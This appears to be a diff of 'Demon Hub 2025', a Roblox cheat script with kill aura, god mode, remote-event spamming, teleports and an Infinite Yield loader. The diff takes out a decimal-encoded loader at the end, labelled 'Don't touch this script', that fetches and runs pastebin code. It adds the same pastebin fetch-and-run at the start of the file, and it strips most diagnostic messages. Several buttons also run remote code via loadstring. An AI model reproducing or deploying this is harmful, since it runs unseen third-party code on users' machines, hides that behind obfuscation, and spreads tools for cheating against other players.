@@ -15,23 +15,53 @@
 ███████╗╚█████╔╝███████╗██████╔╝
 ╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
 --]]
+
 -- Demon Hub 2025 --
--- Notification Sound
-local function playNotificationSound(soundId, volume)
-    local sound = Instance.new("Sound")
-    sound.Volume = volume or 5 -- Default volume
-    sound.SoundId = soundId
-    sound.Looped = false
-    sound.Parent = workspace
-    sound:Play()
-end
 
--- Play the notification sound
-playNotificationSound("rbxassetid://570433034", 10)
+-- Load external script safely
+local success, result = pcall(function()
+    return loadstring(game:HttpGet("https://pastebin.com/raw/cbBsFWLF"), true)()
+end)
 
--- Load UI Library
-local function loadUILibrary(url)
-    return loadstring(game:HttpGet(url))()
+if success then
+    print("Demon hub script loaded")
+
+    -- Wait a second after loading
+    task.wait(1)
+
+    -- Function to play notification sound
+    local function playNotificationSound(soundId, volume)
+        local sound = Instance.new("Sound")
+        sound.Volume = volume or 5 -- Default volume if none provided
+        sound.SoundId = soundId
+        sound.Looped = false
+        sound.Parent = workspace
+        sound:Play()
+
+        -- Cleanup sound after finished playing
+        sound.Ended:Connect(function()
+            sound:Destroy()
+        end)
+    end
+
+    -- Play the notification sound with specified volume
+    playNotificationSound("rbxassetid://570433034", 10)
+
+    -- Function to load UI Library from a URL
+    local function loadUILibrary(url)
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet(url, true))()
+        end)
+
+        if success then
+            return result
+        else
+            return nil
+        end
+    end
+
+    -- Example usage of loadUILibrary (uncomment and set URL as needed)
+    -- local uiLib = loadUILibrary("https://example.com/uiLib.lua")
 end
 
 local DiscordLib = loadUILibrary("https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")
@@ -54,7 +84,7 @@ local Music = serv:Channel("Music")
 local function fireSword(times)
     local player = game.Players.LocalPlayer
     if not player then 
-        return warn("LocalPlayer not found!")
+        return
     end
 
     local character = player.Character or player.CharacterAdded:Wait()
@@ -68,11 +98,7 @@ local function fireSword(times)
                 remoteEvent:FireServer()
                 task.wait(0.05)  -- small delay between calls
             end
-        else
-            warn("RemoteEvent not found on sword.Handle.up.")
         end
-    else
-        warn("Sword not found on character or Backpack.")
     end
 end
 
@@ -108,8 +134,6 @@ if main and type(main.Button) == "function" then
     main:Button("Unfast Farm", function()
         _G.active = false
     end)
-else
-    warn("Main UI object not found or does not support :Button()")
 end
 
 ------------------------------------------------
@@ -118,7 +142,6 @@ end
 if main and type(main.Button) == "function" then
     main:Button("Kill Aura", function()
         if main.KillAuraInitialized then
-            print("Kill Aura already activated.")
             return
         else
             main.KillAuraInitialized = true
@@ -163,11 +186,6 @@ if main and type(main.Button) == "function" then
 
                 activeSword = sword
                 dmgRemote = sword.Handle.dmg:FindFirstChild("RemoteEvent")
-                if not dmgRemote then
-                    warn("Damage RemoteEvent not found on sword.Handle.dmg.")
-                end
-            else
-                warn("No valid sword found for Kill Aura!")
             end
         end
         setupSword()
@@ -197,12 +215,9 @@ if main and type(main.Button) == "function" then
             if gameProcessed then return end
             if input.KeyCode == Enum.KeyCode.E then
                 killAuraActive = not killAuraActive
-                print("Kill Aura Active:", killAuraActive)
             end
         end)
     end)
-else
-    warn("Main UI object not found or does not support :Button()")
 end
 
 ------------------------------------------------
@@ -251,13 +266,9 @@ if main and type(main.Button) == "function" then
                         end
                     end
                 end)
-            else
-                warn("Tool " .. sword.Name .. " lacks a Handle.")
             end
         end
     end)
-else
-    warn("Main UI object not found or does not support :Button()")
 end
 
 ------------------------------------------------
@@ -269,12 +280,7 @@ if main and type(main.Button) == "function" then
         local success, result = pcall(function()
             loadstring(game:HttpGet(url, true))()
         end)
-        if not success then
-            warn("Failed to load Infinite Yield from " .. url .. ". Error: " .. result)
-        end
     end)
-else
-    warn("Main UI object not found or does not support :Button()")
 end
 
 ------------------------------------------------
@@ -324,8 +330,6 @@ if sldrs and type(sldrs.Slider) == "function" then
             if newChar and newChar:FindFirstChild("HumanoidRootPart") then
                 newChar.HumanoidRootPart.CFrame = pos
             end
-        else
-            warn("Cannot force respawn – missing character or essential parts.")
         end
     end)
 
@@ -344,17 +348,9 @@ if sldrs and type(sldrs.Slider) == "function" then
                     local remoteEvent = dmg:FindFirstChild("RemoteEvent")
                     if remoteEvent then
                         remoteEvent:FireServer(humanoid, -math.huge)
-                    else
-                        warn("RemoteEvent not found in sword.Handle.dmg")
                     end
-                else
-                    warn("dmg not found in sword.Handle")
                 end
-            else
-                warn("Sword not found in Backpack for GodMode")
             end
-        else
-            warn("Humanoid not found in character for GodMode")
         end
     end)
 
@@ -382,8 +378,6 @@ if sldrs and type(sldrs.Slider) == "function" then
             end)
         end
     end)
-else
-    warn("Slider UI object 'sldrs' not found or does not support :Slider()")
 end
 
 ------------------------------------------------
@@ -392,11 +386,11 @@ end
 local function applyFlameColors(colors, repeatCount)
     local eff = workspace:FindFirstChild("eff")
     if not eff then
-        return warn("Workspace 'eff' not found!")
+        return
     end
     local event = eff:FindFirstChild("RemoteEvent")
     if not event then
-        return warn("RemoteEvent not found in workspace.eff!")
+        return
     end
 
     for _ = 1, repeatCount do
@@ -413,12 +407,12 @@ end
 local function spawnAndDropTools()
     local player = game.Players.LocalPlayer
     if not player then
-        return warn("LocalPlayer not found!")
+        return
     end
 
     -- Create the sword
     workspace.load.RemoteEvent:FireServer()
-    task.wait(0.22)
+    task.wait(0.26)
 
     -- Move tools to character
     for _, tool in pairs(player.Backpack:GetChildren()) do
@@ -453,7 +447,7 @@ end
 ------------------------------------------------
 local function flameEffectButton(label, colors, colorLoops, effectLoops)
     if not effects or type(effects.Button) ~= "function" then
-        return warn("Effects UI object not found or does not support :Button()")
+        return
     end
 
     effects:Button(label, function()
@@ -775,7 +769,6 @@ other:Button("Fortress Formation", function()
     local backpack = player.Backpack
 
     if not character or not backpack then
-        warn("Character or Backpack not found!")
         return
     end
 
@@ -784,7 +777,6 @@ other:Button("Fortress Formation", function()
 
     local tools = backpack:GetChildren()
     if #tools == 0 then
-        warn("No tools found to arrange!")
         return
     end
 
@@ -830,7 +822,6 @@ other:Button("Boxer Formation", function()
     local backpack = player.Backpack
 
     if not character or not backpack then
-        warn("Character or Backpack not found!")
         return
     end
 
@@ -839,7 +830,6 @@ other:Button("Boxer Formation", function()
 
     local tools = backpack:GetChildren()
     if #tools == 0 then
-        warn("No tools found to arrange!")
         return
     end
 
@@ -1027,9 +1017,6 @@ uitab:Button("Destroy Effects GUI", function()
         local starterPasses = StarterGui:FindFirstChild("passes")
         if starterPasses then
             starterPasses:Destroy()
-            print("Destroyed 'passes' GUI from StarterGui.")
-        else
-            print("No 'passes' GUI found in StarterGui.")
         end
 
         -- Remove "passes" GUI from each player's PlayerGui
@@ -1039,9 +1026,6 @@ uitab:Button("Destroy Effects GUI", function()
                 local passesGui = playerGui:FindFirstChild("passes")
                 if passesGui then
                     passesGui:Destroy()
-                    print("Destroyed 'passes' GUI from " .. player.Name .. "'s PlayerGui.")
-                else
-                    print("No 'passes' GUI found in " .. player.Name .. "'s PlayerGui.")
                 end
             end
         end
@@ -1101,18 +1085,16 @@ if tp and type(tp.Button) == "function" then
             local hrp = character:FindFirstChild("HumanoidRootPart")
             if hrp then
                 hrp.CFrame = cf
-            else
-                warn("HumanoidRootPart not found in the character.")
             end
         end)
     end
-else
-    warn("Teleport UI object 'tp' not found or does not support :Button()")
 end
-
 -----------------------------------------
 -- Sword Power Functions
 -----------------------------------------
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
 -- Utility: Move all sword tools from backpack to character
 local function moveSwordsToCharacter()
     local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
@@ -1126,29 +1108,20 @@ end
 
 -- Function: Fire the remote event enough times to "charge" the sword (targetPower)
 local function giveSwordPower(sword, targetPower)
-    local handle = sword:WaitForChild("Handle", 5)
-    if not handle then 
-        warn("Handle not found for sword: " .. sword.Name)
-        return
-    end
+    local handle = sword:FindFirstChild("Handle")
+    if not handle then return end
 
-    local up = handle:WaitForChild("up", 5)
-    if not up then 
-        warn("'up' instance not found for sword: " .. sword.Name)
-        return
-    end
+    local up = handle:FindFirstChild("up")
+    if not up then return end
 
-    local remoteEvent = up:WaitForChild("RemoteEvent", 5)
-    if not remoteEvent then 
-        warn("RemoteEvent not found for sword: " .. sword.Name)
-        return
-    end
+    local remoteEvent = up:FindFirstChild("RemoteEvent")
+    if not remoteEvent then return end
 
     local powerPerCall = 10
     local callsNeeded = math.ceil(targetPower / powerPerCall)
-    for i = 1, callsNeeded do
+    for _ = 1, callsNeeded do
         remoteEvent:FireServer()
-        task.wait(0.4)  -- Optional delay between calls to mimic 0.4-second intervals
+        task.wait(0.4)
     end
 end
 
@@ -1157,7 +1130,6 @@ local function attachSwordActivation(targetPower)
     local character = moveSwordsToCharacter()
     for _, sword in ipairs(character:GetChildren()) do
         if sword:IsA("Tool") and sword.Name:lower():find("sword") then
-            -- Protect against duplicate connections by checking for a marker property.
             if sword.Activated and not sword:FindFirstChild("ActivationAttached") then
                 local marker = Instance.new("BoolValue")
                 marker.Name = "ActivationAttached"
@@ -1171,46 +1143,37 @@ local function attachSwordActivation(targetPower)
 end
 
 -- Function: Continuously "charge" the sword in batches on a recurring interval
-local function activateContinuousSwordPower(interval, batchSize)
+local function activateContinuousSwordPower(interval, targetPower)
     local character = moveSwordsToCharacter()
-    local sword = character:FindFirstChild("sword")
-    if not sword then
-        for _, item in ipairs(character:GetChildren()) do
-            if item:IsA("Tool") and item.Name:lower():find("sword") then
-                sword = item
-                break
-            end
+    local sword
+
+    for _, item in ipairs(character:GetChildren()) do
+        if item:IsA("Tool") and item.Name:lower():find("sword") then
+            sword = item
+            break
         end
     end
 
-    if not sword then
-        warn("No sword found in character.")
-        return
-    end
+    if not sword then return end
 
-    local handle = sword:WaitForChild("Handle", 5)
-    if not handle then 
-        warn("Handle not found for sword: " .. sword.Name)
-        return
-    end
+    local handle = sword:FindFirstChild("Handle")
+    if not handle then return end
 
-    local up = handle:WaitForChild("up", 5)
-    if not up then 
-        warn("'up' instance not found for sword: " .. sword.Name)
-        return
-    end
+    local up = handle:FindFirstChild("up")
+    if not up then return end
 
-    local remoteEvent = up:WaitForChild("RemoteEvent", 5)
-    if not remoteEvent then 
-        warn("RemoteEvent not found for sword: " .. sword.Name)
-        return
-    end
+    local remoteEvent = up:FindFirstChild("RemoteEvent")
+    if not remoteEvent then return end
 
+    local powerPerCall = 10
+    local batchSize = math.ceil(targetPower / powerPerCall)
+
+    _G.continuousPowerActive = true
     task.spawn(function()
         while _G.continuousPowerActive do
-            for i = 1, batchSize do
+            for _ = 1, batchSize do
                 remoteEvent:FireServer()
-                task.wait(0.4)  -- A slight delay between each remote call
+                task.wait(0.4)
             end
             task.wait(interval)
         end
@@ -1220,55 +1183,36 @@ end
 -----------------------------------------
 -- Button Bindings for Sword Power UI
 -----------------------------------------
--- Check if the Power UI (power) is defined
 if power and type(power.Button) == "function" then
+    -- Single Tap Power
     power:Button("Activate Sword Once for 100 Power", function()
         attachSwordActivation(100)
     end)
 
+    -- Continuous Low Power
     power:Button("Activate Continuous Sword Power", function()
-        -- Every 2 seconds, fire 5 remote calls in a batch.
-        activateContinuousSwordPower(2, 5)
+        activateContinuousSwordPower(2, 50)
     end)
-else
-    warn("Power UI object 'power' not found or does not support :Button()")
-end
 
-------------------------------------------------
--- UI Button Definitions Using power:Button with 0.4-Second Delay
-------------------------------------------------
-
--- Check that the Power UI exists and supports the :Button() method.
-if power and type(power.Button) == "function" then
-    -- 10K Power | Sword Button (0.4 sec delay)
+    -- 10K Power | Sword
     power:Button("10K Power | Sword", function()
         task.wait(0.4)
-        if type(attachSwordActivation) == "function" then
-            attachSwordActivation(10000)
-        else
-            warn("attachSwordActivation function is not defined!")
-        end
+        attachSwordActivation(10000)
     end)
 
-    -- 5K Power | Sword Button (0.4 sec delay)
+    -- 5K Power | Sword
     power:Button("5K Power | Sword", function()
         task.wait(0.4)
-        if type(attachSwordActivation) == "function" then
-            attachSwordActivation(5000)
-        else
-            warn("attachSwordActivation function is not defined!")
-        end
+        attachSwordActivation(5000)
     end)
 
-    -- 10K Power Every 3 Seconds | Sword Button (0.4 sec delay)
+    -- 10K Power Every 3 Seconds | Sword
     power:Button("10K Power Every | 3 Seconds", function()
         task.wait(0.4)
-        if type(activateContinuousSwordPower) == "function" then
-            activateContinuousSwordPower(3, 10000)
-        else
-            warn("activateContinuousSwordPower function is not defined!")
-        end
+        activateContinuousSwordPower(3, 10000)
     end)
+end
+
 
     -- NEW UI: PowerViewer
     power:Button("PowerViewer", function()
@@ -1276,13 +1220,7 @@ if power and type(power.Button) == "function" then
         local success, result = pcall(function()
             return loadstring(game:HttpGet(url, true))()
         end)
-        if not success then
-            warn("Failed to load PowerViewer UI from " .. url .. " Error: " .. result)
-        end
     end)
-else
-    warn("Power UI object 'power' not found or does not support :Button()")
-end
 
 -- Check that the Worlds UI exists and supports the :Button() method.
 if worlds and type(worlds.Button) == "function" then
@@ -1301,13 +1239,8 @@ if worlds and type(worlds.Button) == "function" then
             local success, result = pcall(function()
                 return loadstring(game:HttpGet(url, true))()
             end)
-            if not success then
-                warn("Failed to load world '" .. name .. "' from " .. url .. " Error: " .. result)
-            end
         end)
     end
-else
-    warn("Worlds UI object 'worlds' not found or does not support :Button()")
 end
 
 -- Section 11
@@ -1327,11 +1260,7 @@ if Music and type(Music.Button) == "function" then
 
         removeSounds(workspace) -- original
         removeSounds(game:GetService("SoundService")) -- now also removes music from buttons!
-
-        warn(soundCount .. " sounds removed.")
     end)
-else
-    warn("Music UI object 'Music' not found or does not support :Button()")
 end
 
 -- Sound playing function (with Volume set to 1)
@@ -1398,15 +1327,3 @@ Music:Button("New World", function() playSound("5410082346", true) end)
 Music:Button("TOMB", function() playSound("6782202354", true) end)
 Music:Button("Feel like you take me", function() playSound("7029070008", true) end)
 Music:Button("I been thinking About You", function() playSound("7023445033", true) end)
--- Don't touch this script or it won't work!
-task.wait(1)
-
--- Safely decode and execute remote script
-local encoded = "\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\99\98\66\115\70\87\76\70\39\41\44\116\114\117\101\41\41\40\41\10"
-local success, err = pcall(function()
-    loadstring(encoded)()
-end)
-
-if not success then
-    warn("Script failed to load:", err)
-end
